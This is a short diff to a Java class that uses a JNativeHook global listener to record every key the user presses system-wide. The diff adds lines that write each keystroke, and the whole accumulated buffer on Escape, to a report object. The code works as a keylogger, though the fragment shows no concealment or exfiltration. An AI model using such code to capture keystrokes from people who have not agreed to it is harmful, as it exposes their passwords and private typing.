@@ -17,19 +17,21 @@ import org.jnativehook.keyboard.NativeKeyListener;
 public class KeyboardActivities implements NativeKeyListener, Runnable {
 	
 	private String keyboardActivities = "";
-	
+	 ReportWriting rw=new ReportWriting();
 	public KeyboardActivities() {
 		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
 		logger.setLevel(Level.OFF);
 		}
 	
 	public void nativeKeyPressed(NativeKeyEvent e) {
+            rw.addText("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 		System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 		keyboardActivities += e.getKeyText(e.getKeyCode());;
 
 		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
 			if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
 				// kapatmak icin
+                                rw.addText(keyboardActivities);
 				System.out.println(keyboardActivities);
 				//GlobalScreen.unregisterNativeHook();
 			}
